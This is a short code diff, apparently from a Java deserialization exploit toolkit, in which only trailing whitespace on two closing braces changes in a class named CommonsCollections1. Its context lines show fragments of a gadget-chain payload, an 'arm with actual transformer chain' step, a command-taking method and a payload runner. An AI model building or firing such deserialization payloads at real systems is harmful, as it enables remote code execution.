@@ -70,7 +70,7 @@ public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<
 		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	
 				
 		return handler;
-	}	
+	}
 	
 	public InvocationHandler getObjectSleep(final String command) throws Exception {
 		//final long[] execArgs = new long[] { Long.parseLong(command)};
@@ -104,7 +104,7 @@ public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<
 		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	
 				
 		return handler;
-	}
+	}	
 	
 	public static void main(final String[] args) throws Exception {
 		PayloadRunner.run(CommonsCollections1.class, args);
